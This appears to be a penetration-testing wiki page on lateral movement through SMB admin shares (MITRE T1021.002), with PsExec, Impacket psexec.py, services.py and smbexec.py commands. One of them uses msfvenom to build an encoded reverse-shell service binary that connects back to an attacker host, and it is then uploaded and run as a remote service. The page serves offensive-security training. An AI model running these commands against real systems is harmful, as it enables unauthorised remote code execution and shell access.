---
description: 'MITRE ATT&CK™ Remote Services: SMB/Windows Admin Shares - Technique T1021.002'
---

# SMB-based

## Theory

[SMB Protocol](../delivery/protocols/smb.md) can be abuse by attackers to execute remote code and perform lateral movements.

## Practice

### PsExec

Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), It connect to the $ADMIN shares with SMB and upload a service binary. Psexec uses psexesvc.exe as the name. Then it connect to the service control manager to create and run a service named PSEXESVC associated with the previous binary. Finally Psexec create some named pipes to handle stdin/stdout/stderr.

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) can execute a remote process.

```bash
psexec.py username:password@10.10.10.10 cmd.exe
```

We may manually replicate techniques use by PsExec with [service.py](https://github.com/fortra/impacket/blob/master/examples/services.py) from impacket

```bash
# Create an exe as a service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT> -f exe-service --platform windows -e x64/xor_dynamic  -o shell.exe

# Upload the exe to windows machine
smbclient '\\<TARGET>\smbshare' -U <user> -c "put shell.exe test.exe"

# Using impacket services.py create service remotely
services.py WORKGROUP/<user>@<TARGET> create -name shell-svc -display my-shell-svc -path "\\\\<TARGET>\\smbshare\\shell.exe"

# Using impacket services.py start the service and get the shell
services.py WORKGROUP/<user>@<TARGET> start -name shell-svc
```
{% endtab %}

{% tab title="Windows" %}
On windows, we can use [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) from Windows Sysinternals tools

```powershell
#Run PsExec
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```
{% endtab %}
{% endtabs %}

### SmbExec

SmbExec is an [Impacket](https://github.com/fortra/impacket) script that works similarly to PsExec without using RemComSvc. The main difference is that smbexec avoids transferring a potentially detectable binary to the target site. Instead, it lives completely off the land by running the local Windows command shell. \
implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine **does NOT have a writeable share** available.

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) can execute a remote process.

```bash
#Semi-interactive shell (doesn't need writable share on the target)
smbexec.py <domain>/<username>:<password>@<host>
```
{% endtab %}
{% endtabs %}

